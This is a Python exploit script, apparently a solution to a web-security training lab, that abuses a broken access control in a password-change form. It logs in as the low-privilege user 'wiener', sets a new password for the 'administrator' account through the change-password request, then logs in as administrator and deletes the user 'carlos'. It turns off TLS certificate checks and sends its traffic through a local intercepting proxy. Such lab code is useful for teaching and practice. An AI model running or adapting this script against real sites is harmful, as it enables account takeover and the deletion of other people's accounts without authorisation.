import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def change_administrator_password(s, url):

    # Extract the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login in as the wiener user
    print("(+) Logging in as the wiener user....")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user...")

        # Change the password of the administrator user.
        print("(+) Changing the password of the administrator user...")
        change_password_url = url + "/my-account/change-password"
        csrf_token = get_csrf_token(s, url + "/my-account")
        data_change_password = {"csrf": csrf_token, "username": "administrator", "new-password-1": "test", "new-password-2": "test"}
        r = s.post(change_password_url, data=data_change_password, verify=False, proxies=proxies)
        res = r.text
        if "Password changed successfully" in res:
            print("(+) Successfully changed the administrator password.")
        else:
            print("(-) Could not change the administrator password.")
            sys.exit(-1)
    else:
        print("(-) Could not login as user.")
        sys.exit(-1)


def delete_carlos(s, url):
    # Extract the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login in as the administrator user
    print("(+) Logging in as the administrator user....")
    data_login = {"csrf": csrf_token, "username": "administrator", "password": "test"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the administrator user...")    

        # Delete Carlos user.
        delete_carlos_url = url + "/admin/delete?username=carlos"
        r = s.get(delete_carlos_url, verify=False, proxies=proxies)

        if "Congratulations" in r.text:
            print("(+) Successfully delete the Carlos user.")
        else:
            print("(-) Could not delete the Carlos user.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the administrator user.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    change_administrator_password(s, url)

    s2 = requests.Session()
    delete_carlos(s2, url)


if __name__ == "__main__":
    main()